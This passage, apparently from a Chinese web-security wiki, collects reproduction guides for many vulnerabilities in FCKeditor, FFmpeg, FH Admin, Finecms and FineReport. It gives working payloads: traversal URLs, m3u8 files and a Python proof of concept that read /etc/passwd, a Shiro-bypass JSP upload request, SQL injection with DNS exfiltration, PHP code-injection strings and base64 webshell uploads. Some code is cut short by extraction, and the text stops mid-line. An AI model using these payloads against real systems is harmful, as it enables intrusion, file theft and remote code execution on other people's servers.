FCKeditor/_samples/asp/sample03.asp FCKeditor/_samples/asp/sample04.asp FCKeditor/_samples/default.html FCKeditor/editor/fckeditor.htm FCKeditor/editor/fckdialog.html FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jsp FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/aspx/connector.Aspx fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/php/connector.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:57 "},"Web安全/FCKeditor/四、FCKeditor 列目录/四、FCKeditor 列目录.html":{"url":"Web安全/FCKeditor/四、FCKeditor 列目录/四、FCKeditor 列目录.html","title":"四、FCKeditor 列目录","keywords":"","body":"1、FCKeditor/editor/fckeditor.html FCKeditor/editor/fckeditor.html不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页，可以查看已经上传的文件。 2、根据xml返回信息查看网站目录 http://www.-sec.org/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp 3、获取当前文件夹 FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ 4、游览c盘 /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=c:/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:57 "},"Web安全/Ffmpeg/（CVE-2016-1897）Ffmpeg ssrf/（CVE-2016-1897）Ffmpeg ssrf.html":{"url":"Web安全/Ffmpeg/（CVE-2016-1897）Ffmpeg ssrf/（CVE-2016-1897）Ffmpeg ssrf.html","title":"（CVE-2016-1897）Ffmpeg ssrf","keywords":"","body":"（CVE-2016-1897）Ffmpeg ssrf 一、漏洞简介 CVE-2016-1897只能读取文件的第一行 #EXTM3U 标签是m3u8的文件头，开头必须要这一行 #EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒 #EXT-X-VERSION:2 该标签可有可无 #EXTINF:6, 表示该一段TS流文件的长度 #EXT-X-ENDLIST 这个相当于文件结束符 二、漏洞影响 FFmpeg 2.x 三、复现过程 FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(https://www.0-sec.org/ffmpeg-protocols.html\\#concat )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示： #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://dx.su/header.m3u8|file:///etc/passwd #EXT-X-ENDLIST Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:57 "},"Web安全/Ffmpeg/（CVE-2016-1898）Ffmpeg 任意文件读取漏洞/（CVE-2016-1898）Ffmpeg 任意文件读取漏洞.html":{"url":"Web安全/Ffmpeg/（CVE-2016-1898）Ffmpeg 任意文件读取漏洞/（CVE-2016-1898）Ffmpeg 任意文件读取漏洞.html","title":"（CVE-2016-1898）Ffmpeg 任意文件读取漏洞","keywords":"","body":"（CVE-2016-1898）Ffmpeg 任意文件读取漏洞 一、漏洞简介 CVE-2016-1898可以读取文件任意行 #EXTM3U 标签是m3u8的文件头，开头必须要这一行 #EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒 #EXT-X-VERSION:2 该标签可有可无 #EXTINF:6, 表示该一段TS流文件的长度 #EXT-X-ENDLIST 这个相当于文件结束符 二、漏洞影响 FFmpeg 2.x 三、复现过程 FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(https://www.0-sec.org/ffmpeg-protocols.html\\#subfile )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示： #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://localhost/header.m3u8|subfile,,start,0,end,64,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,64,end,128,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,128,end,256,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,256,end,512,,:///etc/passwd #EXT-X-ENDLIST Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:58 "},"Web安全/Ffmpeg/（CVE-2017-9993）Ffmpeg 任意文件读取漏洞/（CVE-2017-9993）Ffmpeg 任意文件读取漏洞.html":{"url":"Web安全/Ffmpeg/（CVE-2017-9993）Ffmpeg 任意文件读取漏洞/（CVE-2017-9993）Ffmpeg 任意文件读取漏洞.html","title":"（CVE-2017-9993）Ffmpeg 任意文件读取漏洞","keywords":"","body":"Ffmpeg 任意文件读取漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 使用exp生成payload ./gen_xbin_avi.py file:///etc/passwd exp.avi 生成exp.avi，在http://www.0-sec.org:8080/上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中： Ffmpeg任意文件读取漏洞/media/rId24.png) poc #!/usr/bin/env python3 import struct import argparse import random import string AVI_HEADER = b\"RIFF\\x00\\x00\\x00\\x00AVI LIST\\x14\\x01\\x00\\x00hdrlavih8\\x00\\x00\\x00@\\x9c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00LISTt\\x00\\x00\\x00strlstrh8\\x00\\x00\\x00txts\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x19\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x00\\x00\\x00\\x86\\x03\\x00\\x00\\x10'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\xa0\\x00strf(\\x00\\x00\\x00(\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\xa0\\x00\\x00\\x00\\x01\\x00\\x18\\x00XVID\\x00H\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00LIST movi\" ECHO_TEMPLATE = \"\"\"### echoing {needed!r} #EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x{iv} #EXTINF:1, #EXT-X-BYTERANGE: 16 /dev/zero #EXT-X-KEY: METHOD=NONE \"\"\" # AES.new('\\x00'*16).decrypt('\\x00'*16) GAMMA = b'\\x14\\x0f\\x0f\\x10\\x11\\xb5\"=yXw\\x17\\xff\\xd9\\xec:' FULL_PLAYLIST = \"\"\"#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 {content} #### random string to prevent caching: {rand} #EXT-X-ENDLIST\"\"\" EXTERNAL_REFERENCE_PLAYLIST = \"\"\" #### External reference: reading {size} bytes from {filename} (offset {offset}) #EXTINF:1, #EXT-X-BYTERANGE: {size}@{offset} {filename} \"\"\" XBIN_HEADER = b'XBIN\\x1A\\x20\\x00\\x0f\\x00\\x10\\x04\\x01\\x00\\x00\\x00\\x00' def echo_block(block): assert len(block) == 16 iv = ''.join(map('{:02x}'.format, [x ^ y for (x, y) in zip(block, GAMMA)])) return ECHO_TEMPLATE.format(needed=block, iv=iv) def gen_xbin_sync(): seq = [] for i in range(60): if i % 2: seq.append(0) else: seq.append(128 + 64 - i - 1) for i in range(4, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) for i in range(12, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) return seq def test_xbin_sync(seq): for start_ind in range(64): path = [start_ind] cur_ind = start_ind while cur_ind 0: packet_size -= 16 assert packet_size > 0 part_size = min(packet_size, 64) packet_size -= part_size result.append(echo_block(gen_xbin_packet_header(part_size))) result.append( EXTERNAL_REFERENCE_PLAYLIST.format( size=part_size, offset=offset, filename=filename)) offset += part_size return ''.join(result), offset def gen_xbin_playlist(filename_to_read): pls = [echo_block(XBIN_HEADER)] next_delta = 5 for max_offs, filename in ( (5000, filename_to_read), (500, \"file:///dev/zero\")): offset = 0 while offset 参考链接 https://vulhub.org/\\#/environments/ffmpeg/phdays/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:58 "},"Web安全/FH Admin/FH Admin 任意文件上传漏洞/FH Admin 任意文件上传漏洞.html":{"url":"Web安全/FH Admin/FH Admin 任意文件上传漏洞/FH Admin 任意文件上传漏洞.html","title":"FH Admin 任意文件上传漏洞","keywords":"","body":"FH Admin 任意文件上传漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 plugins/uploadify/uploadFile.jsp，即在项目下面存在文件夹plugins，其下面存在文件夹uploadify，而uploadify文件夹下面同时存在uploadFile.jsp文件；那么该项目非常有可能存在漏洞。 uploadFile.jsp文件内容如下： it = fileList.iterator(); String name = \"\"; String extName = \"\"; while (it.hasNext()) { FileItem item = it.next(); if (!item.isFormField()) { name = item.getName(); long size = item.getSize(); String type = item.getContentType(); //System.out.println(size + \" \" + type); if (name == null || name.trim().equals(\"\")) { continue; } // 扩展名格式： if (name.lastIndexOf(\".\") >= 0) { extName = name.substring(name.lastIndexOf(\".\")); } File file = null; if(null != fileNmae && !\"\".equals(fileNmae)){ file = new File(savePath + fileNmae); }else{ do { if(null != fileNmae && !\"\".equals(fileNmae)){ file = new File(savePath + fileNmae); }else{ name = new java.text.SimpleDateFormat(\"yyyyMMddhhmmss\").format(new Date()); //获取当前日期 name = name + (int)(Math.random()*90000+10000); file = new File(savePath + name + extName); } } while (file.exists()); } File saveFile = new File(savePath + name + extName); try { item.write(saveFile); } catch (Exception e) { e.printStackTrace(); } } } response.getWriter().print((name.trim() + extName.trim()).trim()); } %> 尝试访问此文件，提示未登录302跳转 由于该框架使用到了shiro，如若shiro版本过低会导致shiro身份绕过漏洞，结合文库shiro部分的身份认证绕过利用即可getshell 我们使用 /;a/plugins/uploadify/uploadFile.jsp 代码不唯一！！！具体请参考文库shiro权限绕过部分文章！！！ 来绕过shiro的权限控制，可以注意到状态码为200 结合之前给出的代码需要两个参数构造上传包 发现上传成功，但是居然找不到文件。 仔细看了一下才知道request.getParameter(\\\"uploadPath\\\");解析不了multipart里的参数，再次构造上传包 POST /;a/plugins/uploadify/uploadFile.jsp?uploadPath=/plugins/uploadify/ HTTP/1.1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQDeBiVqfe6p3FMnJ ------WebKitFormBoundaryQDeBiVqfe6p3FMnJ Content-Disposition: form-data; name=\"imgFile\"; filename=\"2204249.jsp\" Content-Type: image/jpeg test ------WebKitFormBoundaryQDeBiVqfe6p3FMnJ-- 成功shell 参考链接 https://xz.aliyun.com/t/8311 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:59 "},"Web安全/Finecms/（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞/（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞.html":{"url":"Web安全/Finecms/（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞/（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞.html","title":"（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞","keywords":"","body":"（CVE-2018-18191）Finecms 5.4 存在CSRF漏洞 一、漏洞简介 Dayrui FineCms是中国天睿（Dayrui）程序设计团队发布的一套使用MVC架构和PDO数据库接口开发的内容管理系统（CMS）。 Dayrui FineCms 5.4版本中的/admin.php?c=member&m=edit&uid=1存在跨站请求伪造漏洞。远程攻击者可利用该漏洞修改管理员账户密码。 二、漏洞影响 Finecms 5.4 三、复现过程 poc history.pushState('', '', '/') Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:06 "},"Web安全/Finecms/（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞/（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞.html":{"url":"Web安全/Finecms/（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞/（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞.html","title":"（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞","keywords":"","body":"（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞 一、漏洞简介 Finecms 5.2.0版本中的controllers/member/Api.php文件存在SQL注入漏洞，该漏洞源于程序没有进行有效的过滤。远程攻击者可利用该漏洞执行SQL命令。 二、漏洞影响 Finecms 5.2.0 三、复现过程 漏洞位置在： finecms/dayrui/controllers/member/Api.php 590行左右 public function checktitle() { $id = (int)$this->input->get('id'); $title = $this->input->get('title', TRUE); $module = $this->input->get('module'); (!$title || !$module) && exit(''); $num = $this->db->where('id<>', $id)->where('title', $title)->count_all_results(SITE_ID.'_'.$module); $num ? exit(fc_lang(''.fc_lang('重复').'')) : exit(''); } 可以看到方法count_all_results()使用了$module,count_all_results()方法如下： public function count_all_results($table = '', $reset = TRUE) { if ($table !== '') { $this->_track_aliases($table); $this->from($table); } // ORDER BY usage is often problematic here (most notably // on Microsoft SQL Server) and ultimately unnecessary // for selecting COUNT(*) ... if ( ! empty($this->qb_orderby)) { $orderby = $this->qb_orderby; $this->qb_orderby = NULL; } $result = ($this->qb_distinct === TRUE OR ! empty($this->qb_groupby) OR ! empty($this->qb_cache_groupby) OR $this->qb_limit OR $this->qb_offset) ? $this->query($this->_count_string.$this->protect_identifiers('numrows').\"\\nFROM (\\n\".$this->_compile_select().\"\\n) CI_count_all_results\") : $this->query($this->_compile_select($this->_count_string.$this->protect_identifiers('numrows'))); if ($reset === TRUE) { $this->_reset_select(); } // If we've previously reset the qb_orderby values, get them back elseif ( ! isset($this->qb_orderby)) { $this->qb_orderby = $orderby; } if ($result->num_rows() === 0) { return 0; } $row = $result->row(); return (int) $row->numrows; } 可以看到对传入的table参数进行了是否为空校验以及经过两个函数的处理，再跟进_track_aliases函数继续进行分析： protected function _track_aliases($table) { if (is_array($table)) { foreach ($table as $t) { $this->_track_aliases($t); } return; } // Does the string contain a comma? If so, we need to separate // the string into discreet statements if (strpos($table, ',') !== FALSE) { return $this->_track_aliases(explode(',', $table)); } // if a table alias is used we can recognize it by a space if (strpos($table, ' ') !== FALSE) { // if the alias is written with the AS keyword, remove it $table = preg_replace('/\\s+AS\\s+/i', ' ', $table); // Grab the alias $table = trim(strrchr($table, ' ')); // Store the alias, if it doesn't already exist if ( ! in_array($table, $this->qb_aliased_tables, TRUE)) { $this->qb_aliased_tables[] = $table; if ($this->qb_caching === TRUE && ! in_array($table, $this->qb_cache_aliased_tables, TRUE)) { $this->qb_cache_aliased_tables[] = $table; $this->qb_cache_exists[] = 'aliased_tables'; } } } } 可以看到table在这个函数中经过了较多过滤，继续看下一个函数from： public function from($from) { foreach ((array) $from as $val) { if (strpos($val, ',') !== FALSE) { foreach (explode(',', $val) as $v) { $v = trim($v); $this->_track_aliases($v); $this->qb_from[] = $v = $this->protect_identifiers($v, TRUE, NULL, FALSE); if ($this->qb_caching === TRUE) { $this->qb_cache_from[] = $v; $this->qb_cache_exists[] = 'from'; } } } else { $val = trim($val); // Extract any aliases that might exist. We use this information // in the protect_identifiers to know whether to add a table prefix $this->_track_aliases($val); $this->qb_from[] = $val = $this->protect_identifiers($val, TRUE, NULL, FALSE); if ($this->qb_caching === TRUE) { $this->qb_cache_from[] = $val; $this->qb_cache_exists[] = 'from'; } } } return $this; } 可以看到经过这两个函数以及finecms本身get方法的过滤，能用的符号不多了，但是括号以及逗号都还能使用。 在测试的时候，如果传入的参数比如：module=1，则会爆表不存在的错误，并且可以看到查询的语句，而module参数位于from位置，也就是查询的表的位置，于是使用逗号分割查询的表，并使用dns外带数据 payload如下 http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select load_file(concat(0x5c5c5c5c,version(),0x2e6d7973716c2e61687a6935672e636579652e696f5c5c616263))) as total Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:05 "},"Web安全/Finecms/Finecms 5.0.10 sql注入漏洞/Finecms 5.0.10 sql注入漏洞.html":{"url":"Web安全/Finecms/Finecms 5.0.10 sql注入漏洞/Finecms 5.0.10 sql注入漏洞.html","title":"Finecms 5.0.10 sql注入漏洞","keywords":"","body":"Finecms 5.0.10 sql注入漏洞 一、漏洞简介 auth值是由zero_ci_session中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义 二、漏洞影响 Finecms 5.0.10 三、复现过程 http://0-sec.org/index.php?c=api&m=目标站点的值¶m=action=sql%20sql=%27select%20version();%27 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:01 "},"Web安全/Finecms/Finecms 5.0.10 任意代码执行漏洞/Finecms 5.0.10 任意代码执行漏洞.html":{"url":"Web安全/Finecms/Finecms 5.0.10 任意代码执行漏洞/Finecms 5.0.10 任意代码执行漏洞.html","title":"Finecms 5.0.10 任意代码执行漏洞","keywords":"","body":"Finecms 5.0.10 任意代码执行漏洞 一、漏洞简介 auth值是由zero_ci_session中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义 二、漏洞影响 Finecms 5.0.10 三、复现过程 漏洞分析 这个漏洞的文件在/finecms/dayrui/controllers/Api.php的data2() public function data2() { $data = array(); // 安全码认证 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // 授权认证码不正确 $data = array('msg' => '授权认证码不正确', 'code' => 0); } else { // 解析数据 $cache = ''; $param = $this->input->get('param'); if (isset($param['cache']) && $param['cache']) { $cache = md5(dr_array2string($param)); $data = $this->get_cache_data($cache); } if (!$data) { // list数据查询 $data = $this->template->list_tag($param); $data['code'] = $data['error'] ? 0 : 1; unset($data['sql'], $data['pages']); // 缓存数据 $cache && $this->set_cache_data($cache, $data, $param['cache']); } } // 接收参数 $format = $this->input->get('format'); $function = $this->input->get('function'); if ($function) { if (!function_exists($function)) { $data = array('msg' => fc_lang('自定义函数'.$function.'不存在'), 'code' => 0); } else { $data = $function($data); } } // 页面输出 if ($format == 'php') { print_r($data); } elseif ($format == 'jsonp') { // 自定义返回名称 echo $this->input->get('callback', TRUE).'('.$this->callback_json($data).')'; } else { // 自定义返回名称 echo $this->callback_json($data); } exit; } 可以看到开头这里验证了认证码： // 安全码认证 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // 授权认证码不正确 $data = array('msg' => '授权认证码不正确', 'code' => 0); } else { 授权码在/config/system.php 可以看到SYS_KEY是固定的，我们可以在Cookies找到，/finecms/dayrui/config/config.php 用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。 直接看到这一段，调用了Template对象里面的list_tag函数 if (!$data) { // list数据查询 $data = $this->template->list_tag($param); $data['code'] = $data['error'] ? 0 : 1; unset($data['sql'], $data['pages']); // 缓存数据 $cache && $this->set_cache_data($cache, $data, $param['cache']); } 我们到finecms/dayrui/libraries/Template.php看list_tag函数的代码,代码有点长，我抓重点的地方,这里把param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271的内容分为两个数组$var、$val，这两个数组的内容分别为 $var=['action','name'] $val=['cache%20','MEMBER.1%27];phpinfo();$a=[%271'] $cache=_cache_var是返回会员的信息 重点的是下面的 @eval('$data=$cache'.$this->_get_var($_param).';'); foreach ($params as $t) { $var = substr($t, 0, strpos($t, '=')); $val = substr($t, strpos($t, '=') + 1); 再看这一段,因为swtich选中的是cache，所有就不再进行下面的分析了。 $pos = strpos($param['name'], '.');这句是为下面的substr函数做准备。 是为了分离出的内容为 $_name='MEMBER' $_param=\"1%27];phpinfo();$a=[%271\" // action switch ($system['action']) { case 'cache': // 系统缓存数据 if (!isset($param['name'])) { return $this->_return($system['return'], 'name参数不存在'); } $pos = strpos($param['name'], '.'); if ($pos !== FALSE) { $_name = substr($param['name'], 0, $pos); $_param = substr($param['name'], $pos + 1); } else { $_name = $param['name']; $_param = NULL; } $cache = $this->_cache_var($_name, !$system['site'] ? SITE_ID : $system['site']); if (!$cache) { return $this->_return($system['return'], \"缓存({$_name})不存在，请在后台更新缓存\"); } if ($_param) { $data = array(); @eval('$data=$cache'.$this->_get_var($_param).';'); if (!$data) { return $this->_return($system['return'], \"缓存({$_name})参数不存在!!\"); } } else { $data = $cache; } return $this->_return($system['return'], $data, ''); break; 跟踪get_var函数，在这里我们先把$param的内容假设为a,然后执行函数里面的内容，最后返回的$string的内容是： $string=['a'] 那么我们的思路就是把两边的[\\' \\']闭合然后再放上恶意的代码。 payload为：1'];phpinfo();$a=['1那么返回的$string的内容： $string=['1'];phpinfo();$a=['1'] 漏洞复线 http://0-sec.org/index.php?c=api&m=data2&auth=目标站点的值¶m=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:02 "},"Web安全/Finecms/Finecms 5.0.10 任意文件上传漏洞/Finecms 5.0.10 任意文件上传漏洞.html":{"url":"Web安全/Finecms/Finecms 5.0.10 任意文件上传漏洞/Finecms 5.0.10 任意文件上传漏洞.html","title":"Finecms 5.0.10 任意文件上传漏洞","keywords":"","body":"Finecms 5.0.10 任意文件上传漏洞 一、漏洞简介 二、漏洞影响 Finecms 5.0.10 三、复现过程 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:04 "},"Web安全/Finecms/Finecms 5.0.10 会员中心sql注入漏洞/Finecms 5.0.10 会员中心sql注入漏洞.html":{"url":"Web安全/Finecms/Finecms 5.0.10 会员中心sql注入漏洞/Finecms 5.0.10 会员中心sql注入漏洞.html","title":"Finecms 5.0.10 会员中心sql注入漏洞","keywords":"","body":"Finecms 5.0.10 会员中心sql注入漏洞 一、漏洞简介 二、漏洞影响 Finecms 5.0.10 三、复现过程 http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=1&title=1&module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:05 "},"Web安全/Finecms/Finecms 5.0.8 任意代码执行漏洞/Finecms 5.0.8 任意代码执行漏洞.html":{"url":"Web安全/Finecms/Finecms 5.0.8 任意代码执行漏洞/Finecms 5.0.8 任意代码执行漏洞.html","title":"Finecms 5.0.8 任意代码执行漏洞","keywords":"","body":"Finecms 5.0.8 任意代码执行漏洞 一、漏洞简介 auth值是由zero_ci_session中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义 二、漏洞影响 Finecms 5.0.8 三、复现过程 漏洞分析 在/controllers/Api.php中的data2函数，大约在第115行，有问题的代码大约在178行 public function data2() { $data = array(); // 安全码认证 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // 授权认证码不正确 $data = array('msg' => '授权认证码不正确', 'code' => 0); } else { // 解析数据 $cache = ''; $param = $this->input->get('param'); if (isset($param['cache']) && $param['cache']) { $cache = md5(dr_array2string($param)); $data = $this->get_cache_data($cache); } if (!$data) { if ($param == 'login') { // 登录认证 $code = $this->member_model->login( $this->input->get('username'), $this->input->get('password'), 0, 1); if (is_array($code)) { $data = array( 'msg' => 'ok', 'code' => 1, 'return' => $this->member_model->get_member($code['uid']) ); } elseif ($code == -1) { $data = array('msg' => fc_lang('会员不存在'), 'code' => 0); } elseif ($code == -2) { $data = array('msg' => fc_lang('密码不正确'), 'code' => 0); } elseif ($code == -3) { $data = array('msg' => fc_lang('Ucenter注册失败'), 'code' => 0); } elseif ($code == -4) { $data = array('msg' => fc_lang('Ucenter：会员名称不合法'), 'code' => 0); } } elseif ($param == 'update_avatar') { // 更新头像 $uid = (int)$_REQUEST['uid']; $file = $_REQUEST['file']; // // 创建图片存储文件夹 $dir = SYS_UPLOAD_PATH.'/member/'.$uid.'/'; @dr_dir_delete($dir); if (!is_dir($dir)) { dr_mkdirs($dir); } $file = str_replace(' ', '+', $file); if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { $data = array( 'msg' => '目录权限不足或磁盘已满', 'code' => 0 ); } 其中，首先 $file = $_REQUEST['file']; 获取$file变量 if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { $data = array( 'msg' => '目录权限不足或磁盘已满', 'code' => 0 ); 然后用preg_match函数进行正则匹配，因为$file变量可控，所以$result也是可控的，从而$new_file也是可控的，可以构造为php文件，然后 file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) 对$result[1]进行base64解码，然后写入$new_file文件中。显然，是可以任意写文件进行getshell的。所以，我们要让程序能够运行到这些代码，不能在之前就退出了。要经过 $auth = $this->input->get('auth'); if ($auth != md5(SYS_KEY)) SYS_KEY被系统硬编码为24b16fede9a67c9251d3e7c7161c83ac，在./WWW/config/system.php中有定义。直接md5加密一次即可绕过 漏洞复现 http://www.0-sec.org:88/index.php?c=api&m=data2&auth=目标站点值¶m=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+ 无需登录，直接getshell,路径为 http://www.0-sec.org:88/uploadfile/member/0/0x0.php 1.png 参考链接 http://4o4notfound.org/index.php/archives/40/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:00 "},"Web安全/Finecms/Finecms 5.0.8 会员中心任意代码执行漏洞/Finecms 5.0.8 会员中心任意代码执行漏洞.html":{"url":"Web安全/Finecms/Finecms 5.0.8 会员中心任意代码执行漏洞/Finecms 5.0.8 会员中心任意代码执行漏洞.html","title":"Finecms 5.0.8 会员中心任意代码执行漏洞","keywords":"","body":"Finecms 5.0.8 会员中心任意代码执行漏洞 一、漏洞简介 二、漏洞影响 Finecms 5.0.8 三、复现过程 漏洞分析 在文件./controllersmemberAccount.php中的upload函数 if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $file, $result)){ $new_file = $dir.'0x0.'.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) { exit(dr_json(0, '目录权限不足或磁盘已满')); 漏洞复现 注册会员，登录访问： http://www.0-sec.org:88/index.php?s=member&c=account&m=upload POST：tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+ 2.png 3.png 参考链接 http://4o4notfound.org/index.php/archives/40/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:01 "},"Web安全/FineReport/FineReport 任意文件读取漏洞/FineReport 任意文件读取漏洞.html":{"url":"Web安全/FineReport/FineReport 任意文件读取漏洞/FineReport 任意文件读取漏洞.html","title":"FineReport 任意文件读取漏洞","keywords":"","body":"FineReport 任意文件读取漏洞 一、漏洞简介 二、漏洞影响 FineReport v8.0FineReport v9.0 三、复现过程 漏洞代码位于fr-chart-8.0.jar文件的com.fr.chart.web.ChartGetFileContentAction中 1.png这里由ActionNoSessionCMD类扩展而来，跟进这个类其实就是对用户权限做一个简单的认证，实际上帆软报表在具体函数里会自定义认证模式，所以这个类可以略过。2.png这里通过request将文件名传进来，同时这里使用了cjkDecode函数来解密文件名，但跟进这个函数就会发现对我们所传入的文件名没有任何影响，继续跟进接着使用invalidResourcePath函数来验证文件名是否存在 1234 public static boolean invalidResourcePath(String paramString) { return (StringUtils.isEmpty(paramString) || paramString.indexOf(false) != -1) ? true : (paramString.startsWith(\\\"http\\\") ? ((paramString.indexOf(\\\"127.0.0.1\\\") != -1 || paramString.indexOf(\\\"localhost\\\") != -1)) : ((paramString.indexOf(\\\"..\\\") != -1 